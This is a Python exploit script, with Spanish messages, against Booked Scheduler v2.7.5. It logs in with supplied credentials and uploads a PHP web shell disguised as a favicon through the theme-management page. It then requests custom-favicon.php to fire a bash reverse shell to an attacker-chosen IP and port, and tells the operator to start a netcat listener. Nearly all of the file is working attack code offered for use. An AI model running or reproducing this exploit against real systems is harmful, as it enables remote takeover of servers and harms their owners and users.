#/usr/bin/python3

from pwn import *
import requests
import pyfiglet

ascii_banner = pyfiglet.figlet_format("Booked Scheduler v2.7.5")

def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))

prLightPurple(ascii_banner)

prYellow ("Author:")
prLightGray("Johnny Chafla\n")
prYellow("Nickname:")
prLightGray("jch\n")
prYellow("Site:")
prLightGray("https://hacknotes.github.io/\n")

def ctrl_c(sig,frame):

	prRed ("\nSaliendo...!!\n")
	sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

def is_vulnerable():

 try:

  target = sys.argv[1]
  target_port = sys.argv[2]
  local_ip = sys.argv[5]
  local_port = sys.argv[6]

  p1=log.progress("Ponte en escucha")
  time.sleep(1)
  p1.status("nc -nlvp " + local_port)
  time.sleep(1)
  url = "http://%s:%s/booked/Web/" %(target, target_port)
  p2 = log.progress("Verificando " + url)
  time.sleep(2)
  r = requests.get(url, timeout=3)

  if (r.status_code == 200):

   p2.status("Ok!!")
   time.sleep(1)
   p3 = log.progress("¿Vulnerable?")
   sleep(2)
   version = re.findall("Booked Scheduler v2.7.5", r.text)

   if(version):

     p3 = log.success("VULNERABLE!!")

   else:

    p3 = log.info("NO VULNERABLE :(")
    sys.exit(1)

 except:
  p2=log.info("Verifica la URL :(")
  sys.exit(1)

def connection():

 target = sys.argv[1]
 target_port = sys.argv[2]
 url = "http://%s:%s/booked/Web/" %(target, target_port)
 url_login = url + "index.php"

 time.sleep(1)
 p4 = log.progress("Ingresando al sitio web")
 time.sleep(2)
 p4.status(url_login)
 time.sleep(2)
 s = requests.session()

 user = sys.argv[3]
 password = sys.argv[4]

 login_data = {
  'email':user,
  'password':password,
  'captcha':'',
  'login':'submit',
  'resume':'',
  'language':'en_us'
 }

 r = s.post(url_login, data=login_data)

 if "We could not match your username or password" in r.text:

  p4 = log.info("Usuario o contraseña incorrectas")
  sys.exit(1)

 else:

  local_ip = sys.argv[5]
  local_port = sys.argv[6]

  p4 = log.success("Acceso correcto!!")
  time.sleep(2)
  p4 = log.success("Obtén tu shell!!")
  payload = '<?php system("bash -c \'bash -i >& /dev/tcp/' + local_ip + '/' + local_port + ' 0>&1\'"); ?>'
  token = re.findall(r'name="CSRF_TOKEN" value="(.*?)"', r.text)[0]

  file_to_upload = {
   'FAVICON_FILE': ('cmback.php', payload, 'application/x-php'), 
   'CSRF_TOKEN':(None, token)
  }

  headers = {
    'X-Requested-With':'XMLHttpRequest',
    'Referer': url + "admin/manage_theme.php",
    'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept':'*/*'
  }

  url = "http://%s:%s/booked/Web/" %(target, target_port)
  url_upload = url + "admin/manage_theme.php?action=update"

  r = s.post(url_upload, files=file_to_upload, headers=headers)
  rce_url = url + "custom-favicon.php"
  r = s.get(rce_url)

if __name__ == '__main__':

 if len(sys.argv) < 7:

   prYellow("\nUSO:\n")
   prLightGray ("python3 "+ sys.argv[0] + " <target ip> <target port> <user> <password> <local ip> <local port>\n")

   prYellow("\nEJEMPLO:\n")
   prLightGray("python3 "+ sys.argv[0] + " 192.168.88.64 8003 \"admin\" \"adminadmin\" 192.168.88.64 22")

   sys.exit(1)

 else:

  is_vulnerable()
  connection()
  sys.exit(0)
